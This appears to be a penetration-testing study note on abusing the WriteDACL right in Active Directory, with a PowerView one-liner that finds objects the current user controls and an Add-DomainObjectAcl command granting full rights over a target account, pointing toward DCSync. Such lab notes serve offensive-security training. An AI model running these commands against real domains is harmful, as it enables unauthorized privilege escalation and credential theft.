As previously stated, all Active Directory objects have a DACL and one object access right in particular (WriteDACL) grants permission to modify the DACL itself.

Enumerate the misconfiguration:

```
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

If ActiveDirectoryRights included WriteDacl we can use Add-DomainObjectAcl powerview method to add additional rights such as GenericWrite or even DCSync.

![[Pasted image 20210702193528.png]]

```
Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
```

